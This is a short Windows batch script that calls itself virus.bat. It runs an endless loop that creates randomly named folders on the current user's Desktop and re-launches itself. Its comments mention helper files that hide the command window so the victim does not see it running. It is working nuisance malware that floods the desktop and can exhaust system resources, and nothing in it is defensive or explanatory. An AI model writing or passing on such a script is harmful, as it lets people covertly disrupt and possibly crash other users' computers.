@echo off
REM this is the main code,hiddencmd.bat can be used to hide the command prompt. "invisible.vbs" is used to hide the command prompt
:a
c:
cd\
REM destination where you want to make folders
cd C:\Users\%username%\Desktop
REM make a folder by name having random numbers
md %random%%random%%random%%random%%random%
REM path to virus.bat or hiddencmd.bat to make this process fast
C:\Users\%username%\Desktop\virus.bat
REM loop this process
goto a